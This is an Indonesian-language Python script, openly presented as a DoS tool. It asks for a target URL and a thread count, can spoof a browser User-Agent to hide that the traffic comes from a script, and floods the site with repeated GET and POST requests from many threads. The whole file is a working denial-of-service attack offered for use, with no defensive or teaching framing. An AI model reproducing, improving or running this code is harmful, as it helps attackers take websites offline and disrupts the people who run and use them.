import threading
import requests
from requests.exceptions import RequestException, ConnectionError, HTTPError, InvalidURL
from time import sleep

url = input("Mau Dos link website apa 😈\n")
proses = input("mau berapa proses, makin banyak proses, makin gacor Dos nya 🤯😈 walau jadi nge-lag\n")
mode_anonim = input("kamu ingin indetitas kamu sebagai python disembunyikan?\njika iya tulis '1' atau 'yes', kalau tidak tulis '0' atau 'no'")
#isian untuk mengisi input Dos agar berjalan

try:
    proses = int(proses)
except Exception:
    print("jumlah prorses tidak boleh diisi selain angka 😡🔥")
    exit(1)

if not (url.startswith("http://") or url.startswith("https://")):
    print("URL salah 😡🫵")
    exit(1)

if mode_anonim.lower() in ("1", "yes"):
    mode_anonim = True
elif mode_anonim.lower() in ("0", "no"):
    mode_anonim = False
else:
    print("tidak boleh menulis selain 'yes', '1', 'no', '0', harap jalankan ulang program")
    exit(1)
# pengecekan input benar atau salah 

pesan = threading.Event()
list_t = []
if mode_anonim:
    pengkecoh = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
else:
    pengkecoh = {
        "User-Agent": "python-requests/2.31.0",
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'}



def request_dos(link, pesan):
    r = None
    while not pesan.is_set():
        try:
            r = requests.get(link, headers=pengkecoh, timeout=6)
            r.raise_for_status()
            try:
                requests.post(link, headers=pengkecoh, timeout=6)
            except Exception:
                pass
        except ConnectionError:
            print("koneksi bermasalah")
            break
        except InvalidURL:
            print("URL salah")
            pesan.set()
            break
        except RequestException as e:
            try:
                print("error karena", e)
            except Exception:
                pass
            break
#Skrip Dos

print("membuat proses")
for i in range(proses):
    t = threading.Thread(target=request_dos, args=(url, pesan), name=str(i), daemon=True)
    list_t.append(t)
    t.start()
print("pembuatan thread berhasil")
#buat proses yang kerja barengan untuk Dos

try:
    while True:
        if pesan.is_set():
            for t in list_t:
                t.join(timeout=0.1)
            break
        else:
            sleep(1)
except KeyboardInterrupt:
        pesan.set()
        for t in list_t:
                t.join(timeout=0.1)
        exit(0)
finally:
        exit(0)
#untuk nunggu error dari thread lain dan kalau error, untuk stop thread lain
#except di atas untuk menangkap "ctrl-c", dan gunanya untuk menghentikan proses lain dan proses utama stop   
